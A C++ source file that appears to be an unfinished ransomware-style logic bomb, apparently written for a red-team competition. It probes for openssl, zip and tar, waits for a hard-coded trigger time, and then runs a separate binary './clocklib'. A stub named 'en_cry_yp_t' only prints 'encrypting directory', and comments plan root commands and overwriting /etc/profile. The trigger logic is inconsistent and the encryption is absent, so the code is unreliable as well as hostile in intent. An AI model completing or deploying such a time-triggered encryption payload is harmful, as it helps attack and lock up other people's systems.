#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <iomanip>
#include <ctime>
#define TRIGGER 61532067600

std::string ex_ec(const char* cmd){
    FILE* pipe;
	char path[128];
	std::string result = "";

	/* open pipe (POSIX Dependant)*/
	pipe = popen(cmd, "r");
	if (pipe == NULL) {
	    printf("Failed to run command\n" );
	    exit(1);
	}

	/* Read the output a line at a time - output it. */
	while (fgets(path, sizeof(path)-1, pipe) != NULL) {
		//printf("%s", path);
		result += path;
	}

	/* close */
	pclose(pipe);
	return result;
}

bool contains(std::string in, std::string search_str){
	size_t pos = in.find(search_str);
	if (pos == std::string::npos) { // npos == -1
		return false;
	}
	return true;
}

void en_cry_yp_t(std::string path){

    std::cout << "encrypting directory: " << path << std::endl;
}

int main(){
    /* Check for current time */
    std::time_t t = std::time(nullptr);
    std::time_t tgr = t+10; //trigger 10 seconds
    std::tm * tm_var; // Datetime of target (Competition day at 12:00 EST) //Lunch
    std::tm trigger; // Datetime of target (Competition day at 12:00 EST) //Lunch
    bool openssl, zip, tar;
	std::string out;

	// check the local time 
    // Remember, it must NOT be local time. Preferrably to UTC
    // Competition is across several time zones
    tm_var = std::localtime(&t); 
    std::cout << "check:   " << std::put_time(tm_var, "%c %Z") << '\n';
	
    openssl = contains(ex_ec("which openssl"),"openssl");
    zip = contains(ex_ec("which zip"),"zip");
    tar = contains(ex_ec("which tar"),"tar");

	//std::cout << openssl << std::endl;
	//std::cout << zip << std::endl;
	//std::cout << tar << std::endl;

    // Time competition of trigger
    // UTC (mktime) = 61532067600
    trigger.tm_year = 2019;
    trigger.tm_mon = 10;
    trigger.tm_mday = 16;
    trigger.tm_hour = 12;
    trigger.tm_min = 0;
    trigger.tm_sec = 0;

    tm_var->tm_year = 2019;
    tm_var->tm_mon = 10;
    tm_var->tm_mday = 21;
    std::cout << "Sleeping..." << std::endl;

    // At the start of every minute
    // Can't interrupt without SIGTSTP
    t = std::time(nullptr);
    while ( t != tgr ){
        t = std::time(nullptr);
        if (t == TRIGGER){
            std::cout << "hit the trigger: run clocklib\n" << std::endl;
            system("./clocklib");
        }
        tm_var = std::localtime(&t); //Can't use this
        
        std::system("sleep 1");
        printf("sec: %ld \n",t % 60);
    }
    std::cout << std::time(nullptr) << std::endl;

    //printf("seconds past the minute: %d\n", tm->tm_sec);
    //std::cout << std::endl;
    //tm->tm_hour = 12;
    //std::cout  << std::put_time( &tm, "%c" ) << std::endl;
    //std::cout  << std::asctime(tm) << std::endl;

    /* Run various system commands as root */
	/* Open the command for reading. */
    //System (overwrite /etc/profile)
    return 0;
}
